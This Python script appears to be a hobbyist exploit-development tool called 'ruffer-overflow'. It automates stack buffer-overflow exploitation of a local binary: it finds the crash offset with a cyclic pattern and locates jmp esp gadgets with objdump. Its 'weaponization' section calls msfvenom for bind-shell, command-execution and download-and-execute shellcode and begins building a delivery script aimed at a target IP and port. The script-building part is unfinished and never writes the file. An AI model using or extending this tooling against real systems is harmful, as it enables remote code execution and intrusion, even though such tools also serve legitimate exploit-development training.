#!/usr/bin/python3

import socket
import os
import sys
import getopt
import time
import subprocess
import re
import struct
import platform
import datetime

#region tuning
PATTERN_SIZE = 5000 #characters
LOAD_TIME = 5 #seconds
#endregion

#region lookups
""""platforms"""
PLATFORM_WINDOWS = "windows"
PLATFORM_LINUX = "linux"

"""architecture"""
ARCH_16_BIT = "16-bit"
ARCH_32_BIT = "32-bit"
ARCH_64_BIT = "64-bit"

"""known file type strings for binaries"""
FILE_TYPE_STRING_ELF16 = "ELF 16-bit"
FILE_TYPE_STRING_ELF32 = "ELF 32-bit"
FILE_TYPE_STRING_ELF64 = "ELF 64-bit"
FILE_TYPE_STRING_PE16 = "PE16"
FILE_TYPE_STRING_PE32 = "PE32"
FILE_TYPE_STRING_PE64 = "PE64"

"""application types"""
APP_TYPE_SERVER = "server"
APP_TYPE_CLI = "cli"
#endregion

#region banners
def print_banner():
    """prints of the "ruffer-overflow" banner
    """
    banner =  "           ____,'`-,\n"
    banner += "      _,--'   ,/::.;\n"
    banner += "   ,-'       ,/::,' `---.___        ___,_\n"
    banner += "   |       ,:';:/        ;'\"';\"`--./ ,-^.;--.\n"
    banner += "   |:     ,:';,'         '         `.   ;`   `-.\n"
    banner += "    \\:.,:::/;/ -:.                   `  | `     `-.\n"
    banner += "     \\:::,'//__.;  ,;  ,  ,  :.`-.   :. |  ;       :.\n"
    banner += "      \\,',';/O)^. :'  ;  :   '__` `  :::`.       .:' )\n"
    banner += "      |,'  |\\__,: ;      ;  '/O)`.   :::`;       ' ,'\n"
    banner += "           |`--''            \\__,' , ::::(       ,'\n"
    banner += "           `    ,            `--' ,: :::,'\\   ,-'\n"
    banner += "            | ,;         ,    ,::'  ,:::   |,'\n"
    banner += "            |,:        .(          ,:::|   `\n"
    banner += "            ::'_   _   ::         ,::/:|\n"
    banner += "           ,',' `-' \\   `.      ,:::/,:|\n"
    banner += "          | : _  _   |   '     ,::,' :::\n"
    banner += "          | \\ O`'O  ,',   ,    :,'   ;::\n"
    banner += "           \\ `-'`--',:' ,' , ,,'      ::\n"
    banner += "            ``:.:.__   ',-','        ::'\n"
    banner += "    -hrr-      `--.__, ,::.         ::'\n"
    banner += "                   |:  ::::.       ::'\n"
    banner += "                   |:  ::::::    ,::'\n"
    banner += "########################################################\n"
    banner += "#                   ruffer-overflow                    #\n"
    banner += "#           don't \"bark\" up the wrong tree.            #\n"
    banner += "#======================================================#\n"
    banner += "#         weak-sauce tool for buffer-overflow          #\n"
    banner += "#              please don't crime with it.             #\n"
    banner += "########################################################\n"
    print(banner)
#endregion

#region validation
"""
copied from: https://stackoverflow.com/a/4017219
post by danilo bargen and tzot
"""
def is_valid_ipv4_address(address):
    """validate an ipv4 address

    Args:
        address (str): suspected ipv4 address to validate

    Returns:
        boolean: if the string is a valid ipv4 address
    """
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  # no inet_pton here, sorry
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

    return True

def is_valid_ipv6_address(address):
    """validate an ipv6 address

    Args:
        address (str): suspected ipv6 address to validate

    Returns:
        boolean: if the string is a valid ipv6 address
    """
    try:
        socket.inet_pton(socket.AF_INET6, address)
    except socket.error:  # not a valid address
        return False
    return True

def is_valid_ip(address):
    """validate an ip address

    Args:
        address (str): suspected ip address

    Returns:
        boolean: if the string is an ip address
    """
    return is_valid_ipv4_address(address) or is_valid_ipv6_address(address)
#endregion

#region user interaction
def prompt_yn(prompt):
    """prompt the user for a yes or no answer

    Args:
        prompt (str): what to ask the user

    Returns:
        boolean: if the user said yes
    """
    response = ""
    while response not in ("y", "n"):
        response = prompt_base(prompt + "(y/n)")
    return response == "y"

def prompt_ip(prompt):
    """prompt the user for a valid ip address

    Args:
        prompt (str): what to ask the user

    Returns:
        boolean: if the user said yes
    """
    response = ""
    while not is_valid_ip(response):
        response = prompt_base(prompt)
    return response
    
def prompt_number(prompt, low_limit = 1, high_limit = 65535):
    """prompt the user for a number in a range

    Args:
        prompt (str): what to ask the user
        low_limit (int, optional): lowest allowable number (inclusive). Defaults to 1.
        high_limit (int, optional): highest allowable number (inclusive). Defaults to 65535.

    Returns:
        int: a number in the range given
    """
    while True:
        try:
            response = int(prompt_base(prompt))
            if low_limit <= response <= high_limit:
                return response
        except:
            pass

def prompt_list(prompt, options):
    """prompt the user to select an option from a list

    Args:
        prompt (str): what to ask the user
        options (str[]): allowable options for the user to select

    Returns:
        str: the option the user selected
    """
    while True:
        print(prompt)
        for i in range(0, len(options)):
            print(f"{i})\t{options[i]}")
        response = prompt_base("")
        try:
            response = int(response)
            if 0 <= response < len(options):
                return options[response]
        except:
            pass

def prompt_table(prompt, table):
    while True:
        print(prompt)
        for i in range(0, len(table)):
            row_format = "{:>15}" * (len(table[i]) + 1)
            print(f"{i})\t" + row_format.format("", *table[i]))
        response = prompt_base("")
        try:
            response = int(response)
            if 0 <= response < len(table):
                return table[response]
        except:
            pass

def prompt_base(prompt):
    """the base prompt function

    Args:
        prompt (str): what to ask the user

    Returns:
        str: the users input
    """
    return input(prompt + ": ")

def log_error(error_message, no_exit=False):
    """prints out standard logging sytle error message and exits

    Args:
        error_message (str): error message
        no_exit (Boolean): exit the system after error message
    """
    log(f"error: ")
    if not no_exit:
        exit()

def log(info):
    """prints out standard logging style

    Args:
        info (str): logging message
    """
    print(f"[{info}]")
#endregion

#region local environment validation
#todo: add checks for other utilities (ie. grep, netstat)
#todo: add check for msfvenom
#todo: add check for objdump
def check_architecture(target_architecture):
    if target_architecture == ARCH_16_BIT:
        # should be fine
        pass
    elif target_architecture == ARCH_32_BIT:
        # should be fine
        pass
    elif target_architecture == ARCH_64_BIT:
        # needs to be a 64 bit system
        is_64_bit_system = platform.machine().endswith("64")
        if not is_64_bit_system:
            log_error("you are unable to analyze a 64-bit binary on a non-64-bit system")
    else:
        log_error(f"something is strange with the architecture type '{target_architecture}'")

def check_platform(target_platform):
    if target_platform == PLATFORM_LINUX:
        pass
    elif target_platform == PLATFORM_WINDOWS:
        # requires wine
        try:
            subprocess.run(["wine", "--help"], check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        except:
            log_error("wine needs to be installed")
    else:
        log_error(f"something is strange with the platform type '{target_platform}'")

def check_dependencies(target_binary, target_platform, target_architecture, target_type):
    check_architecture(target_architecture)
    check_platform(target_platform)
#endregion

#region toolkit
"""pattern tools from ickerwx/pattern library on github"""
def get_pattern(length = PATTERN_SIZE):
    """generate a non-repeating pattern to identify memory positions

    Args:
        length (int, optional): how long of a pattern to generate. Defaults to PATTERN_SIZE.

    Returns:
        str: a non-repeating pattern
    """
    pattern = ''
    parts = ['A', 'a', '0']
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    return pattern

def get_pattern_offset(value, pattern = "", length = PATTERN_SIZE):
    """calculates size of offset from buffer overflow

    Args:
        value (str): value seen in memory register
        pattern (str, optional): the original pattern, so it doesn't have to be recalculated. Defaults to regenerating the pattern.
        length (int, optional): the length of the pattern to generate for searching. Defaults to PATTERN_SIZE.

    Returns:
        int: offset size or -1 if not found in pattern
    """
    try:
        if pattern == "":
            pattern = get_pattern(length)
        value = struct.pack('<I', int(value, 16))
        value = value.decode()
        return pattern.index(value)
    except:
        return -1

def send_message_tcp(address, port, message):
    """send a message, via tcp

    Args:
        address (str): ip address to send message to
        port (int): port number to send the message to
        message (byte[]): message to send

    Returns:
        str: response from the server
    """
    socket_connection = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) # tcp
    socket_connection.connect((address, port))
    banner = socket_connection.recv(2048)
    socket_connection.send(message)
    response = socket_connection.recv(2048)
    socket_connection.close()
    return response

def push_message(target_binary, target_platform, target_type, target_port, message):
    stderr = ""
    stdout = ""
    if target_type == APP_TYPE_SERVER:
        try:
            # start the server
            log("starting the server")
            if target_platform == PLATFORM_WINDOWS:
                log("using wine")
                server_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                log("running binary")
                server_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # give it time to start up
            log("allowing time to start")
            time.sleep(LOAD_TIME)
            
            # warn the user of potential error message
            log("expect some kind of error message, just close it if it pops up")

            # encode message
            encoded_message = str.encode(message) 

            # send message
            send_message_tcp("localhost", target_port, encoded_message)

            # record error message
            stderr = server_instance.stderr.read().decode()
            stdout = server_instance.stdout.read().decode()
        except:
            pass
        finally:
            server_instance.kill()
    else:
        try:
            if target_platform == PLATFORM_WINDOWS:
                log("using wine")
                process_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                log("running binary")
                process_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # push map message to stdin
            process_instance.stdin.write(message)

            # record error message
            stderr = process_instance.stderr.read().decode()
            stdout = process_instance.stdout.read().decode()
        except:
            pass   
        finally:
            process_instance.kill()
    return stdout, stderr
#endregion

#region local binary targeting
def get_target_binary():
    """get the target binary file from the user

    Returns:
        str: local path to the file
    """
    file_location = prompt_base("where is the file located?")
    file_location = os.path.abspath(file_location)
    return file_location

def get_target_platform(target_binary):
    """detect or prompt for the platform and architecture a binary is associated with

    Args:
        target_binary (str): path to targeted binary file

    Returns:
        (str, str): platform, architecture tuple
    """
    file_type_string = os.popen(f"file {target_binary}").read()
    if FILE_TYPE_STRING_ELF16 in file_type_string:
        platform = PLATFORM_LINUX
        architecture = ARCH_16_BIT
    elif FILE_TYPE_STRING_ELF32 in file_type_string:
        platform = PLATFORM_LINUX
        architecture = ARCH_32_BIT
    elif FILE_TYPE_STRING_ELF64 in file_type_string:
        platform = PLATFORM_LINUX
        architecture = ARCH_64_BIT
    elif FILE_TYPE_STRING_PE16 in file_type_string:
        platform = PLATFORM_WINDOWS
        architecture = ARCH_16_BIT
    elif FILE_TYPE_STRING_PE32 in file_type_string:
        platform = PLATFORM_WINDOWS
        architecture = ARCH_32_BIT
    elif FILE_TYPE_STRING_PE64 in file_type_string:
        platform = PLATFORM_WINDOWS
        architecture = ARCH_64_BIT
    else:
        log("unable to detect binary type")
        is_linux_bin = prompt_yn("is this a linux binary?")
        if is_linux_bin:
            platform = PLATFORM_LINUX
        else:
            platform = PLATFORM_WINDOWS
        architecture = prompt_list("select the architecture", [ARCH_16_BIT, ARCH_32_BIT, ARCH_64_BIT])
    log(f"platform is {architecture} {platform}")
    return (platform, architecture)

def get_target_type():
    is_cli = prompt_yn("is this a command-line application(not a server)?")
    if is_cli:
        return APP_TYPE_CLI
    else:
        return APP_TYPE_SERVER

def get_target_info():
    target_binary = get_target_binary()
    target_platform, target_architecture = get_target_platform(target_binary)
    target_type = get_target_type()
    return target_binary, target_platform, target_architecture, target_type

def get_binary_start_address(target_binary):
    obj_dump = subprocess.Popen(["objdump", "-f", target_binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    results = obj_dump.stdout.read().decode()
    start_address = results.strip()[-10:]
    return start_address
#endregion

#region local binary analysis
def analyze_local_server_binary_get_ports(target_binary, target_platform):
    log("warning: this will run the binary on your local machine, this could put you at risk")
    detect_ports = prompt_yn("magically detect ports?")
    port = -1
    if detect_ports:
        try:
            # start the server
            log("starting the binary")
            if target_platform == PLATFORM_WINDOWS:
                log("using wine")
                server_instance = subprocess.Popen(["wine", target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                log("running binary")
                server_instance = subprocess.Popen([target_binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # give it time to start up
            log("allowing time to start")
            time.sleep(LOAD_TIME)

            # grab netstat results
            netstat_results = subprocess.check_output(["netstat", "-lnpt"], stderr=subprocess.PIPE).decode("utf-8")

            # ignore anything without pid of the server or the "LISTEN" status
            netstat_results = [line for line in netstat_results.splitlines() if str(server_instance.pid) in line and "LISTEN" in line]

            # extract port numbers
            ports = [int(re.search(r":\d+", line).group(0).strip(":")) for line in netstat_results]
            
            # select port numbers
            if len(ports) > 1:
                port = prompt_list("select a port to target", ports)
            elif len(ports) == 1:
                port = ports[0]
            else:
                log("unable to detect port")
        except:
            log("failed to magically get the port")
        finally:
            # clean up
            log("killing the server")
            server_instance.kill()

    # check if valid port detected
    if not (1 <= port <= 65535):
        # prompt the user for a port if not
        port = prompt_number("target port?")

    log(f"target port {port}")
    return port

def analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix):
    # build pattern and map message
    pattern = get_pattern()
    map_message = target_prefix + pattern

    # inject pattern
    error_message = push_message(target_binary, target_platform, target_type, target_port, map_message)[1]
    
    # identify value
    offset_pattern = re.search(r"Unhandled page fault on read access to 0x[0-9a-f]{8}", error_message).group(0)
    offset_pattern = offset_pattern.strip("Unhandled page fault on read access to 0x")
    log(f"found {offset_pattern}")

    # decode
    offset = get_pattern_offset(offset_pattern, pattern=pattern)
    log(f"offset calculated to be {offset}")

    return offset

def analyze_local_binary_get_target_addresses(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset):
    binaries = [target_binary]

    if target_platform == PLATFORM_WINDOWS:
        additional_binaries = prompt_base("are there any dlls associated with this binary? (separate with a space)")
        binaries.extend([os.path.abspath(binary) for binary in additional_binaries.split(" ")])

    log("locating targetable jump instructions")

    all_targetable_jumps = []

    for binary in binaries:
        # todo: rewrite to be more graceful
        objdump = subprocess.Popen(["objdump", "-D", binary],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepjmp = subprocess.Popen(["grep", "jmp"], stdin=objdump.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        grepesp = subprocess.Popen(["grep", "esp"], stdin=grepjmp.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        results = grepesp.stdout.readlines()

        start_address = get_binary_start_address(binary)
        binary_short_name = os.path.basename(binary)

        if results is not None:
            for line in results:
                instruction = line.decode().strip()
                all_targetable_jumps.append([instruction, binary_short_name, start_address])
    
    if len(all_targetable_jumps) > 1:
        target_instruction = prompt_table("select an instruction to target.", all_targetable_jumps)
    elif len(all_targetable_jumps) == 1:
        target_instruction = all_targetable_jumps[0]
    else:
        log_error("no targetable addresses found")


    target_instruction_address = target_instruction[0][:8]
    target_source_file = target_instruction[1]
    target_base_address = target_instruction[2][-8:]

    target_instruction_offset_distance = int(target_instruction_address, 16) - int(target_base_address, 16)

    log(f"selected the instruction in {target_source_file} at 0x{target_instruction_address} (0x{target_base_address} + {target_instruction_offset_distance}")
    
    return (target_source_file, target_base_address, target_instruction_address, target_instruction_offset_distance)

def analyze_local_binary(target_binary, target_platform, target_architecture, target_type):
    # get port (if necessary)
    target_port = -1 # filler, unused for cli apps
    if target_type == APP_TYPE_SERVER:
        target_port = analyze_local_server_binary_get_ports(target_binary, target_platform)

    target_prefix = prompt_base("what prefix should be used for interaction? (leave blank for none)")

    target_offset = analyze_local_binary_get_offset(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix)
    
    target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance = analyze_local_binary_get_target_addresses(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset)

    return (target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance)
#endregion

#region weaponization
def generate_payload(target_platform):
    windows_payloads = ["windows/shell_bind_tcp", "windows/exec", "windows/download_exec"]
    linux_payloads = ["linux/x86/shell_bind_tcp", "linux/x86/exec"]
    if target_platform == PLATFORM_WINDOWS:
        payload_choice = prompt_list("select a payload.", windows_payloads)
        if payload_choice == "windows/shell_bind_tcp":
            lport = prompt_number("what port would you like it to listen on?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif payload_choice == "windows/exec":
            cmd = prompt_base("what command would you like to be executed?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif payload_choice == "windows/download_exec":
            url = prompt_base("what is the url for the file you would like executed? (should be an exe)")
            file_name = prompt_base("what is the name you would like the file to be saved under?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "windows/download_exec", f"URL={url}", f"EXE={file_name}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print(f"[error selecting payload {payload_choice}]")
            quit()
    else: #linux
        payload_choice = prompt_list("select a payload.", linux_payloads)
        if payload_choice == "linux/x86/shell_bind_tcp":
            lport = prompt_number("what port would you like it to listen on?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "linux/x86/shell_bind_tcp", f"LPORT={lport}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif payload_choice == "linux/x86/exec":
            cmd = prompt_base("what command would you like to be executed?")
            msfvenom = subprocess.Popen(["msfvenom", "-p", "linux/x86/exec", f"CMD={cmd}", "-f", "hex"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print(f"[error selecting payload {payload_choice}]")
            quit()
    print("[generating payload]")
    raw_payload = msfvenom.stdout.read().decode()
    payload = bytes.fromhex(raw_payload)
    return payload

def weaponize(target_binary, target_platform, target_architecture, target_type, target_port, target_prefix, target_offset, target_instruction_source_file, target_instruction_base_address, target_instruction_address, target_instruction_offset_distance):
    payload = generate_payload(target_platform)
    
    build_script = prompt_yn("would you like to build a python delivery script?")
    
    file_name = prompt_base("what would you like to name the file?")
    
    # give command to check base address
    adjust_offset = prompt_yn("would you like to adjust target instruction address?")

    if adjust_offset:
        log(f"current target instruction source file is {target_instruction_source_file}")
        log(f"current target instruction source file base address is 0x{target_instruction_base_address}")
        log(f"current target instruction address is 0x{target_instruction_address} (0x{target_instruction_base_address}+{target_instruction_offset_distance})")
        log("adjusting offset")
        log("you can get the base address using 'objdump -f <file_name>'")
        new_target_instruction_base_address = prompt_base("what is the new base address?")
        new_target_instruction_address = "{:08x}".format(int(new_target_instruction_base_address, 16) + target_instruction_offset_distance)
        target_instruction_base_address = new_target_instruction_base_address
        target_instruction_address = new_target_instruction_address
        log(f"new target instruction source file base address is 0x{target_instruction_base_address}")
        log(f"new target instruction address is 0x{target_instruction_address} (0x{target_instruction_base_address}+{target_instruction_offset_distance})")

    if build_script:
        script =  ""
        script += "#!/usr/bin/python3\n\n"

        script += f"# generated by ruffer-overflow [{datetime.datetime.now()}]\n\n"

        script += "#region targeting\n"
        script += f'BASE_ADDRESS = "{target_instruction_base_address}" # base address of {target_instruction_source_file}\n'
        script += f'TARGET_IP = "" # target host\n'
        script += f'TARGET_PORT = "" # exposed port on the target host\n'
        script += "#endregion\n\n"

        script += "#region imports\n"
        script += "import socket\n"
        script += "#endregion\n\n"

        script += "#region payload\n"
        script += 'buf =  b""'
        script += f'buf += {target_prefix}'
        
        script += "#endregion\n\n"

    else: # generate payload file
        pass
#endregion

if __name__ == "__main__":
    # greet the user
    print_banner()

    # get targeting info from the user
    target_info = get_target_info()

    # verify the system is configured for this target binary
    check_dependencies(*target_info)

    # analyze the binary
    analysis_results = analyze_local_binary(*target_info)
    
    # weaponize
    weaponize(*analysis_results)